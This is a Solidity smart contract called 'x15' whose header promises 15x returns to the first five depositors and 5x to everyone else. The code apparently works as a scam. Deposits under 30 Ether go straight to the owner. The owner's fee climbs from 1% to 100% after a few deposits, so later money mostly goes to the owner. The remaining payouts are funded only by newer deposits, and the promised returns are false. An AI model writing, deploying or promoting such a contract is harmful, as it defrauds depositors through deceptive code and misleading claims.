//------------------------------------------------X15------------------------------------------------------------------------
//
// First 5 Depositors will Multiply their Ether by 15x!!!! The rest of the players will Earn 5x of their Deposits!!!
//
// Minimum Deposit: 30 Ether!
//
// It's crazy, with just 30 Ether Deposit you will Earn 450 Ether!
//
// Start Earning NOW!!!
//
//---------------------------------------------------------------------------------------------------------------------------
contract x15{
struct earnerarray{
address etherAddress;
uint amount;
}
earnerarray[] public crazyearners;
uint public deposits_until_jackpot=0;
uint public totalearners=0; uint public feerate=1;uint public profitrate=200;uint public jackpotrate=700; uint alpha=1; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalmoneyearned=0;
address public kappa; modifier onlyowner{if(msg.sender==kappa)_}
function x15(){
kappa=msg.sender;
}
function(){
enter();
}
function enter(){
if(msg.value<30 ether){
kappa.send(msg.value);
return;
}
uint calculator; uint beta;
uint amount=msg.value;uint tot_pl=crazyearners.length;totalearners=tot_pl+1;
deposits_until_jackpot=20-(totalearners%20);
crazyearners.length+=1;crazyearners[tot_pl].etherAddress=msg.sender;
crazyearners[tot_pl].amount=amount;
feeamount=amount*alpha/100;balance+=amount;totaldeposited+=amount;
if(feeamount!=0){if(balance>feeamount){kappa.send(feeamount);balance-=feeamount;
totalmoneyearned+=feeamount;if(alpha<100)alpha+=30;
else {beta = alpha + crazyearners[tot_pl].amount; calculator= alpha+beta/2; alpha=100; }}} uint payout;uint nr=0;



while(balance>crazyearners[nr].amount*500/100 && nr<tot_pl)
{
if( (nr==0 || nr==1 || nr==2 || nr==3 || nr==4 )  &&  balance>crazyearners[nr].amount*1500/100)
{
payout=crazyearners[nr].amount*1500/100;
crazyearners[nr].etherAddress.send(payout);
balance-=crazyearners[nr].amount*1500/100;
totalmoneyearned+=crazyearners[nr].amount*1500/100;
}
else
{
payout=crazyearners[nr].amount*500/100;
crazyearners[nr].etherAddress.send(payout);
balance-=crazyearners[nr].amount*500/100;
totalmoneyearned+=crazyearners[nr].amount*500/100;
}
nr+=1;
}}}